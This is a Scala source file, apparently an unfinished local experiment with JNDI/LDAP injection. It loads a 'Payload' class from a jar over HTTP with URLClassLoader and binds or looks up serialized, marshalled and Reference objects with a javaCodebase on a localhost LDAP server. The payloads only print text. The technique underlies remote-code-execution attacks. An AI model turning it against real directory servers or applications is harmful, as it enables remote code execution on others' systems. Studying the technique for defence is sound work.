package example.io

import java.io.ObjectInputStream
import java.net.{URL, URLClassLoader}
import java.rmi.MarshalledObject
import java.util
import javax.naming.{Context, Name, Reference, Referenceable, StringRefAddr}
import javax.naming.directory.{BasicAttributes, DirContext, InitialDirContext}
import javax.naming.spi.ObjectFactory

/*
class Payload extends Serializable {
  println("payload loaded")

  private def readObject(in: ObjectInputStream): Unit = {
    in.defaultReadObject()

    println("boom")
  }
}
 */

/*
class RererenceablePayloadFactory extends ObjectFactory {
  override def getObjectInstance(
    obj: Any,
    name: Name,
    nameCtx: Context,
    env: util.Hashtable[_, _]): AnyRef = {

    val factoryClassLoader = getClass.getClassLoader
    val payloadClass = factoryClassLoader.loadClass("example.io.RererenceablePayload")

    payloadClass.newInstance().asInstanceOf[AnyRef]
  }
}
 */

/*
class ReferenceablePayload extends Referenceable {
  override def getReference(): Reference = {
    new Reference(
      getClass.getName,
      new StringRefAddr("command", ""),
      "example.io.RererenceablePayloadFactory",
      "http://localhost/scala-demo-0.1.0-SNAPSHOT.jar")
  }
}
 */

object LdapDemo {
  def main(args: Array[String]): Unit = {
    val env = new util.Hashtable[String, String]()
    env.put(Context.SECURITY_PRINCIPAL, "cn=Directory Manager")
    env.put(Context.SECURITY_CREDENTIALS, "password")

    val initialContext = new InitialDirContext(env)
    val context = initialContext
      .lookup("ldap://localhost:1389/dc=springrecipes,dc=com")
      .asInstanceOf[DirContext]

    // val payload = new Payload()
    // context.rebind("cn=Payload2,dc=springrecipes,dc=com", payload)
    val payloadJarUrl = new URL("http://localhost/scala-demo-0.1.0-SNAPSHOT.jar")
    val urlClassLoader = new URLClassLoader(Array(payloadJarUrl))
    val payloadClass = urlClassLoader.loadClass("example.io.Payload")
    val payload = payloadClass.newInstance()
    println("prepared payload: " + payload)
    println("payload jar url: " + payloadJarUrl)

    // TODO convert to referenceable payload
    // val marshalledPayload = new MarshalledObject(payload)
    // context.rebind("cn=MarshalledPayload01", marshalledPayload)
    // context.rebind("cn=RemotePayload", payload)
    // context.rebind("cn=ReferenceablePayload", new ReferenceablePayload())
    // context.rebind("cn=ReferencePayload", new ReferenceablePayload().getReference())

    val bindAttrs = new BasicAttributes(true)
    bindAttrs.put("javaCodebase", payloadJarUrl.toString)

    val plantedPayload = initialContext
      .lookup("ldap://localhost:1389/cn=MarshalledPayload01,dc=springrecipes,dc=com")
      .asInstanceOf[MarshalledObject[_]]
    println("planted payload class: " + plantedPayload.getClass)
    println("received payload: " + plantedPayload)

    val entries = context.list("")

    while (entries.hasMore) {
      val entry = entries.next()
      println("entry: " + entry)

      // val obj = context.lookup(entry.getName)
    }

    val payloadAttrs = context.getAttributes("cn=ReferencePayload")
    // println("payload attrs: " + payloadAttrs)

    val payloadAttrsEnum = payloadAttrs.getAll
    while (payloadAttrsEnum.hasMore) {
      val attr = payloadAttrsEnum.next()
      println("payload attr: " + attr)
    }

    val referenceablePayload = context.lookup("cn=ReferencePayload")
    println("referenceable payload: " + referenceablePayload)

    // context.modifyAttributes("cn=RemotePayload", DirContext.REMOVE_ATTRIBUTE, bindAttrs)
    // context.modifyAttributes("cn=RemotePayload", DirContext.ADD_ATTRIBUTE, bindAttrs)

    // val attrs = context.getAttributes("o=example")
    // val attrsEnum = attrs.getAll
  }
}
